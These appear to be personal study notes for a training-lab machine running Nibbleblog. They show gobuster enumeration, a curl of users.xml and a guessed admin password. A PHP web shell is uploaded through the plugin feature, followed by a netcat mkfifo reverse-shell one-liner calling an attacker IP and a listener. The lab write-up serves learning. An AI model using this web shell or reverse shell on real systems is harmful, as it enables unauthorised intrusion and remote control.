! We already have access to admin portal


# Plugins exploit
#plugins 
image.php
```php
<?php system('id'); ?>
```

```pug
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```
command execution = yes
```shell-session
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

--> [[Reverse shell]]
#reverse_shell 

we can use this tamplate
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```
-> and add it to image.php
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.128.72.254 9443 >/tmp/f"); ?>
```

#netcat listener 
```pug
nc -lvnp 9443
```
#cURL the image page again or browse to it in `Firefox` at `http://nibbleblog/content/private/plugins/my_image/image.php` to execute the reverse shell.
```pug
nc -lvnp 9443
```
```sh
listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

#TTY
upgrade TTY [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)



# End Quiz
Gain a foothold on the target and submit the user.txt flag
```sh
gobuster dir -u http://10.129.4.5/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.4.5/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/04/25 20:27:28 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 305]
/admin                (Status: 301) [Size: 319] [--> http://10.129.4.5/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]                                         
Progress: 434 / 4615 (9.40%)                                                    /.htaccess            (Status: 403) [Size: 305]                                          
Progress: 776 / 4615 (16.81%)                                                   /content              (Status: 301) [Size: 321] [--> http://10.129.4.5/nibbleblog/content/]
Progress: 1203 / 4615 (26.07%)                                                  Progress: 1682 / 4615 (36.45%)                                                  /index.php            (Status: 200) [Size: 2987]                                           
/languages            (Status: 301) [Size: 323] [--> http://10.129.4.5/nibbleblog/languages/]
Progress: 2288 / 4615 (49.58%)                                                  Progress: 2888 / 4615 (62.58%)                                                  /plugins              (Status: 301) [Size: 321] [--> http://10.129.4.5/nibbleblog/plugins/]  
/README               (Status: 200) [Size: 4628]                                             
Progress: 3494 / 4615 (75.71%)                                                  /themes               (Status: 301) [Size: 320] [--> http://10.129.4.5/nibbleblog/themes/]   
Progress: 4093 / 4615 (88.69%)                                                                                                                                               
===============================================================
2024/04/25 20:27:40 Finished
===============================================================
```
```sh
curl -s http://10.129.4.5/nibbleblog/content/private/users.xml | xmllint  --format -
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">0</session_fail_count>
    <session_date type="integer">1514544131</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
</users>
```

![[Pasted image 20240427164635.png]]
password nibbles from [[2Nibbles - Web Footprinting]]
Then through plugins set up reverse shell.
![[Pasted image 20240427165453.png]]
![[Pasted image 20240427170147.png]]